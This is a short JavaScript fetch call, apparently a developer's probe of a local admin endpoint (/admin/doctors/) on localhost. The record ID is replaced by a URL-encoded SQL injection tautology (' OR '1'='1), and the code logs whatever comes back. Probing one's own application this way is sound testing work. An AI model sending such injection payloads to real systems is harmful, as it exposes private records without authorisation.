fetch("http://localhost:3001/admin/doctors/1%27%20OR%20%271%27=%271", {
    method: 'GET'
})
.then(response => {
    if (!response.ok) {
        return response.json().then(err => { throw new Error(err.message); });
    }
    return response.json();
})
.then(data => {
    console.log(data);
})
.catch(error => {
    console.error('Error:', error.message);
});